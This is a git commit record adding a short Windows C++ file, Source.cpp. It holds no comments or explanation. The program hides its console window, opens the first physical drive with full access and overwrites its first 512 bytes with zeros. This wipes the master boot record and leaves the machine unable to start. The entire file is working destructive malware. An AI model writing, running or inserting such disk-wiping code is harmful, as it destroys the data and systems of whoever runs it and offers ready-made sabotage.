6e30af16962e5d9c0aeb953b87d4db810cdc43ec
Maruf132 <72191792+Maruf132@users.noreply.github.com>
2021-06-07 17:54:25 +0530

    Add files via upload

---
+++ Source.cpp
@@ -0,0 +1,15 @@
+#include <Windows.h>
+#include <iostream>
+
+using namespace std;
+
+int main()
+{
+	FreeConsole();
+	char mbrData[512];
+	ZeroMemory(&mbrData, (sizeof mbrData));
+	HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+	DWORD write;
+	WriteFile(MBR, mbrData, 512, &write, NULL);
+	CloseHandle(MBR);
+}
